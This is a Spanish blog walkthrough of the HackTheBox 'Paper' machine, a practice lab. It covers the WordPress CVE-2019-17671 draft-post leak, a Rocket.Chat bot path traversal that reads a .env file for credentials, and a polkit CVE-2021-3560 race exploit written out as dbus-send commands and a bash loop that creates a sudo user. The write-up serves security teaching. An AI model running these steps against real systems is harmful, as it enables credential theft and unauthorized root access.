---
layout      : post
title       : "HackTheBox - Paper"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432banner.png
category    : [ htb ]
tags        : [ path-traversal, x-backend-server, polkit, rocket.chat, wordpress-vuln ]
---
M√°quina Linux (CentOS) nivel f√°cil. Un **hostname** que se esconde, rayos X contra posts tambi√©n escondidos, un bot nos habla de contrase√±as y aprovechamos para romper el tiempo afectando a `Polkit`.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432paperHTB.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**Creada por**: [secnigma](https://www.hackthebox.eu/profile/92926).

¬øCon qu√© escondido ah?

Nos encontramos un servidor web que esconde el header `X-Backend-Server` con un hostname, con este nuevo sitio explotaremos una vulnerabilidad de `Wordpress` que expone los posts que sean -borradores- o est√©n -privados- en la base de datos. Usando la informaci√≥n obtenida llegaremos a un nuevo subdominio y un chat de empleados. El chat cuenta con un bot el cual juega con el sistema de dos formas, lista el contenido de carpetas y lee el contenido de archivos, moviendo y moviendo llegaremos a unas credenciales v√°lidas para obtener una sesi√≥n en el sistema como el usuario `dwight`.

Utilizando `linpeas.sh` veremos que el sistema es vulnerable al **CVE-2021-3560**, esta vuln aprovecha una embarrada de `polkit` con respecto a tiempos y UID's, empleando ese CVE crearemos un usuario con permisos totales y desde ah√≠ obtenemos una shell como el usuario `root`.

...

### Clasificaci√≥n de la m√°quina seg√∫n la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432rating.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 30%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432statistics.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 80%;"/>

Con algunos CVE y cositas publicas (tirando a la realidad) y otros juegos mentales.

> El blog inicialmente fue para tener mis "notas", nunca se sabe, quizas un dia se me olvida todo üòÑ Despues surgio la otra idea, me di cuenta que esta es una puerta para personitas que como yo, al inicio (o simplemente a veces) nos estancamos en este mundo de la ciberseguridad y no sabemos que hacer o a quien recurrir, as√≠ que si puedo ayudarlos mientras me ayudo, ¬øpor que no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva m√°s de ense√±anza que de solo pasos a seguir. Demosle <3

...

Un objetivo sin un plan solo es un deseo.

1. [Reconocimiento](#reconocimiento).
  * [Enumeraci√≥n de puertos con nmap](#enum-nmap).
2. [Enumeraci√≥n](#enumeracion).
  * [Contenido del servidor web sobre el puerto 80](#puerto-80).
3. [Explotaci√≥n](#explotacion).
  * [¬øPost privados o en borrador? A verlos](#wordpress_draft_posts).
  * [Nos volvemos amigos de un bot pa ver archivos](#rocketchat_bot_discover_files).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

---

## Enumeraci√≥n de puertos con nmap [üìå](#enum-nmap) {#enum-nmap}

Como siempre vamos a ver que puertos (servicios) tiene expuestos la m√°quina, ya que por ah√≠ es por donde buscaremos la manera de explotarla, usar√© `nmap`:

```bash
‚ù± nmap -p- --open -v 10.10.11.143 -oG initScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que est√°n abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [funci√≥n llamada **extractPorts**](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://www.youtube.com/c/s4vitar) que me extrae los puertos en la clipboard |

Nos encuentra estos servicios inicialmente:

| Puerto | Descripci√≥n |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Nos permite obtener una terminal de manera segura. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Servidor web |
| 443    | **[HTTPS](https://es.ryte.com/wiki/HTTPS)**: Servidor web que cuenta con un certificado para dar "seguridad" |

Ahora usemos `nmap` para extraer m√°s info de los puertos, como por ejemplo su versi√≥n de software y que el propio **nmap** ejecute por nosotros algunos scripts a ver si encuentra algo:

**~(Usando la funci√≥n `extractPorts` (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, en este caso no es necesario (ya que tenemos pocos puertos), pero si tuvi√©ramos varios evitamos tener que escribirlos uno a uno**
 
```bash
‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.11.143
    [*] Open ports: 22,80,443

[*] Ports copied to clipboard
```

**)~**

```bash
‚ù± nmap -p 22,80,443 -sC -sV 10.10.11.143 -oN portScan
```

| Par√°metro | Descripci√≥n |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versi√≥n del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y nos devuelve:

| Puerto | Servicio | Versi√≥n |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.0 |
| 80     | HTTP     | Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 |

Tenemos algunas versiones llamativas, d√©mosle a profundidad a ver que encontramos en esta m√°quina...

# Enumeraci√≥n [#](#enumeracion) {#enumeracion}

---

## Contenido del servidor web sobre el puerto 80 [üìå](#puerto-80) {#puerto-80}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432page80.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

La respuesta por default de Apache corriendo sobre **CentOS**, a simple vista nada y jugando con el c√≥digo fuente tampoco vemos nada...

Usando `whatweb` para descubrir los plugins que est√° corriendo la web, vemos lo que nos hab√≠a reportado **nmap** y una cosita interesante:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432bash_whatweb_uncommonHeader_XbackendSERVER.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Nos detecta que existe el **header** `X-Backend-Server` que es poco com√∫n y adem√°s tiene en su contenido algo relacionado con el nombre de la m√°quina: `office.paper`, veamos de que se trata ese **header**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432google_XbackendSERVER.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

* [X-Backend-Server Header](https://www.zaproxy.org/docs/alerts/10039/).

Ese **header** puede filtrar informaci√≥n interna, como por ejemplo direcciones `IP` y `hostnames`, por lo queeeeeee `office.paper` es un **hostname**, ¬øno? O sea, que podr√≠amos intentar agregarlo al `/etc/hosts` y ver si `http://office.paper` nos resuelve algo distinto al **default de Apache**.

> [¬øQu√© es el archivo **/etc/hosts**?](https://es.wikipedia.org/wiki/Archivo_hosts).

```bash
‚ù± cat /etc/hosts
...
# --- HTB
10.10.11.143  office.paper
...
```

Veamos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432page80_officepaper_home.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Y efectivamente, tenemos nuevo contenido!

Juguemos inicialmente con `whatweb` antes de meternos con los posts, a ver que encuentra sobre este nuevo recurso:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432bash_whatweb_officepaper_wordpress.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

De primeras vemos que est√° montado sobre el gestor de contenido [WordPress](https://kinsta.com/es/base-de-conocimiento/que-es-wordpress/) en su versi√≥n `5.2.3`, como **WordPress** tambi√©n es conocida por albergar bastantes vulns, pues vayamos a la web a buscarlas:

# Explotaci√≥n [#](#explotacion) {#explotacion}

> Buscamos `wordpress 5.2.3 vulnerabilities`.

* [WordPress 5.2.3 Vulnerabilities](https://wpscan.com/wordpress/523).

Si vamos a las vulns que arregla la versi√≥n `5.2.4` (o sea, las que estaban si o si en la `5.2.3`) tenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432google_wpscan_vulns_wordpress5_2_3.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

La primera es una vuln muy interesante:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432google_wordpress_vuln_unauthenticatedViewPrivORdraftPosts.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

## ¬øPost privados o en borrador? A verlos [üìå](#wordpress_draft_posts) {#wordpress_draft_posts}

Debido a un problema con la clase que hace consultas en **WordPress** ([WP_Query](https://developer.wordpress.org/reference/classes/wp_query/)) un usuario sin autenticaci√≥n puede listar los posts que est√©n marcados como "privados" o "borradores" :o Pues suena interesante y adem√°s la explotaci√≥n es baaaaastante sencilla, pues probemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432page80_officepaper_home_tryingVIEWdraftYprivatePOSTS_fail.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Pero nop, ac√° perdi un poquito de tiempo, pero gan√© encontrar este post que explora a detalle la vuln y nos la explica, pasat√© por ah√≠:

* [Proof of Concept for "Wordpress \<=5.2.3: viewing unauthenticated posts" (CVE-2019-17671)](https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/)

Adem√°s de entender el c√≥mo y porque es explotada, nos da una visi√≥n sencilla de otra cosa a probar:

```txt
Pasamos de: 
  /?static=1&order=asc
A: 
  /?static=1
```

> üòÑ Una bobadita, pero que suele suceder...

Y si ahora volvemos a intentar en la web:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432page80_officepaper_home_tryingVIEWdraftYprivatePOSTS_done.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

OPAAAA LA POPAAAA! Se nos listan los dichosos posts privados o que estaban en borrador! Se encuentran varias cositas:

1. Un rega√±o a **Michael** para que deje de guardar secretos en los posts.
2. Un subdominio nuevo y una ruta hacia el chat de los empleados.
3. **Michael** dice que los posts no est√°n publicados y al no estarlo, pues nadie de afuera puede acceder a ellos, ya vimos que si :P

As√≠ que agregamos el subdominio al `/etc/hosts` a ver que resuelve contra la direcci√≥n **IP**:

```bash
‚ù± cat /etc/hosts
...
# --- HTB
10.10.11.143  office.paper  chat.office.paper
...
```

Y nos dirigimos a la ruta: `http://chat.office.paper/register/8qozr226AhkCHZdyY`, obtenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432page80_chatofficepaper_registerUser.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Est√° corriendo el servicio [Rocket.Chat](https://www.getapp.com.co/software/112763/rocket-chat):

> üí¨ "<u>Rocket.Chat</u> es una plataforma de comunicaci√≥n y colaboraci√≥n en equipo, de c√≥digo abierto, con chat en vivo, conferencias de video y audio, intercambio de archivos, traducci√≥n de mensajes y m√°s." ~ [getapp.com](https://www.getapp.com.co/software/112763/rocket-chat)

Bien, si registramos una cuenta nos pide generar un nombre de usuario, lo damos y llegamos a ac√°:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432page80_chatofficepaper_home.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

En la izquierda hay un apartado llamado `general`, vamos hacia all√°:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432page80_chatofficepaper_channel_general.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Un chat com√∫n, peeero que si nos fijamos nos habla de un **bot** llamado `recyclops`, este ser√≠a su funcionamiento:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432page80_chatofficepaper_channel_general_botHELP.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Es bastante texto, pero hay dos features que llaman nuestra atenci√≥n:

1. Ver el contenido de un archivo usando `file <archivo>`.
2. Listar que archivos existen en X carpeta: `list <carpeta>`.

Yyyyy para evitar el spam en el chat general `dwight` (el creador del bot) permite que uno pueda enviarle mensajes directos al bot, as√≠ que empecemoooooos :P

## Nos volvemos amigos del bot [üìå](#rocketchat_bot_discover_files) {#rocketchat_bot_discover_files}

Empezamos listando los objetos de donde estamos:

```bash
üôÇ | list
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432page80_chatofficepaper_channel_bot_list.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Dentro de los dos directorios y sus archivos no encontramos nada interesante, si intentamos listar objetos de otras carpetas distintas a las que obtenemos en primera medida ([Directory Traversal](https://www.acunetix.com/blog/articles/path-traversal/) (que es distinto a **LFI**)) logramos ver cositas, por ejemplo el directorio `/home` de `dwight`:

> Logramos unicamente ver contenido de archivos, por esa raz√≥n es un <u>Path Traversal</u> y no un <u>LFI</u> (que permite adem√°s de ver, ejecutar contenido).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432page80_chatofficepaper_channel_bot_listHOMEdwight.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Pues existen varios objetos a los que no se nos permite el acceso, ya que no somos `dwight` :( Dando vueltas entre todos llegamos a la carpeta donde est√°n los objetos asociados al bot: `hubot`:

```bash
üôÇ | list ../../../../../../home/dwight/hubot
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432page80_chatofficepaper_channel_bot_listHUBOT.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Algunos con nombre llamativo, si vamos recorri√©ndolos y caemos sobre `.env` obtenemos cositas:

```bash
üôÇ | file ../../../../../../home/dwight/hubot/.env
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432page80_chatofficepaper_channel_bot_fileHUBOTenv_passwordFOUND.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Ojito, tenemos las credenciales que usa el bot para distintos procesos internos, pues podr√≠amos probar a ver si `dwight` tuvo pereza y asigno esa misma contrase√±a a su usuario en el sistema (si no son v√°lidas, podemos probarlas contra **prisonmike** en **WordPress**):

```bash
‚ù± ssh dwight@10.10.11.143
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432bash_ssh_dwightSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Perrrrfectoo, tenemos una shell como el usuario `dwight` :D Veamos como ser administradores del sistema.

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Despu√©s de listar procesos internos, intentar ver tareas que ejecute `root`, alguna task cron, permisos, SUID's, etc. No vi nada explotable, as√≠ que me fui por el siempre fiable [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/tag/20220612) para que con su automatizaci√≥n de enumeraci√≥n intentara profundizar en cositas m√°s directas y opa opa...

Descargamos el objeto `linpeas.sh`, lo subimos a la m√°quina v√≠ctima (aunque tambi√©n se puede ejecutar sin subirlo, pero a m√≠ me gusta subirlo :P) y ejecutamos:

```bash
[dwight@paper test]$ chmod +x linpeas.sh 
[dwight@paper test]$ ./linpeas.sh
```

Si nos fijamos, gracias a los colores del propio script y su descripci√≥n, tenemos que un posible path para escalar privilegios es que es vulnerable a un **CVE**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432bash_dwightSH_linpeas_VULNtoCVE_2021_3560.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Que s√≠ buscamos sobre esa vuln en internet:

* [Escalado de privilegios mediante Polkit (CVE-2021-3560)](https://www.hackplayers.com/2021/06/escalado-de-privilegios-mediante-polkit.html).

> üíÇ "Si queremos hacer algo que requiera mayores privilegios, por ejemplo, crear una nueva cuenta de usuario, entonces el trabajo de <u>polkit</u> es decidir si se permite o no hacerlo." ~ [hackplayers.com](https://www.hackplayers.com/2021/06/escalado-de-privilegios-mediante-polkit.html)

Nos hablan de como activar `polkit` mediante X herramientas, como por ejemplo `dbus-send`:

> üåê Que se encarga de enviar mensajes por medio del mecanismo de comunicaci√≥n entre procesos llamado [D-Bus](https://es.wikipedia.org/wiki/D-Bus).

El post nos explica de una forma hermosa el c√≥mo se logra la explotaci√≥n, para ello toma este comando como ejemplo para crear un usuario mediante `dbus-send` y otorgarle permisos de **sudo**:

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:usuario1 string:"Usuario de prueba" int32:1
```

Y estos son los pasos por los que pasa:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432google_hackplayers_polkit_dbussend_ExplainedStepBYStep.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Nos explican que la vuln se ejecuta al momento de iniciar el comando `dbus-send` y matarlo (terminarlo) mientras **polkit** a√∫n lo procesa :O

Tomando como referencia los pasos anteriormente listados, nos indican:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432google_hackplayers_polkit_dbussend_polkitISaTROLL.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Uhhhhhhs pailas, loco loco :P

Tambi√©n nos indican que esta explotaci√≥n debe ejecutarse probablemente varias veces, ya que el proceso por el que pasa consta de muuchas validaciones y hay que caer satisfactoriamente en cada una de ellas...

Pues explotemos esta vaaaaainaaaaaa!!!!

## Viajando a root usando el bus [üìå](#dbus-send-polkit) {#dbus-send-polkit}

Lo primero que hacen es validar cuanto tiempo se demora normalmente el comando en ejecutarse, as√≠ sabemos despu√©s en cuanto debemos terminarlo o matarlo:

```bash
[dwight@paper test]$ time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:usuario1 string:"Usuario de prueba" int32:1
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required

real    0m0.044s
user    0m0.004s
sys     0m0.002s
```

Se demor√≥ **44 milisegundos**, pues debemos terminarlo en un tiempo menor a ese, por ejemplo **25 milisegundos** (: D√©mosle forma al POC para crear el usuario `lanz`:

```bash
[dwight@paper test]$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:lanz string:"hola como estas" int32:1 & sleep 0.025s ; kill $!
```

Lo ejecutamos varias veces yyyyyy deber√≠a estar creado el usuario:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432bash_dwightSH_IDlanz.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Se cre√≥ el usuario, ahora debemos crear una contrase√±a en modo hash y despu√©s asign√°rsela al usuario creado:

```bash
‚ù± openssl passwd -5 lanz
$5$setElnzAON0/GcgO$aH1rx64iKAvifLr3wuA7.sw.xMPUH.vGXPmYNF4POZ5
```

Y como √∫ltimo paso debemos asignar esa contrase√±a:

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string:'$5$setElnzAON0/GcgO$aH1rx64iKAvifLr3wuA7.sw.xMPUH.vGXPmYNF4POZ5' string:lanz & sleep 0.025s ; kill $!
```

> Notaste <u>/org/freedesktop/Accounts/User1005</u>? El *1005* sale de ejecutar `id -u <usuario creado>`, es necesario.

Ac√° nos pide la contrase√±a, pero nos la coloca como no v√°lida... Aunque claro, teniendo en cuenta que debemos ser muuuuy r√°pidos, es mejor automatizar cada paso, hacer varios intentos y al final ejecutar `su lanz` cada vez a ver si nos otorga la shell...

```bash
#!/bin/bash

for i in $(seq 1 20); do
    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:lanz string:"hola como estas" int32:1 & sleep 0.025s ; kill $!
    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string:'$5$setElnzAON0/GcgO$aH1rx64iKAvifLr3wuA7.sw.xMPUH.vGXPmYNF4POZ5' string:lanz & sleep 0.025s ; kill $!
done
```

***(Si obtienes algo como:***

```bash
Error org.freedesktop.Accounts.Error.PermissionDenied: Not authorized
```

***Cambiaron los tiempos de demora entre ejecuci√≥n y debes volver a validarlos)***

Ejecutamos el script, al terminar probamos `su lanz`, colocamos la contrase√±a yyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432bash_dwightSH_lanzSH_exploitPolkit_done.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

SOMOS `lanz` en **paper** y tenemos permisos de ejecuci√≥n con `sudo` sobre toooodos los usuarioooooooos, levantemos una terminal como el usuario `root`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432bash_rootSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

Y SOMOS ROOOOOOOOOOOOOOOOOOOOOOOOOOT! Veamos las flags üî•

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/paper/432flags.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>

...

Interesante el tema de ver los posts que est√°n privados o en borrador, me gusto bastante eso. Lo del bot estuvo llamativo, solo que ah√≠ (en el chat) no le vi mucho sentido y la escalada locochona, que cagadota la de `polkit` :P

Bueno, nos charlamos m√°s tardesito :* Y como siempre, a seguir rompiendo de tooodoooo!!!!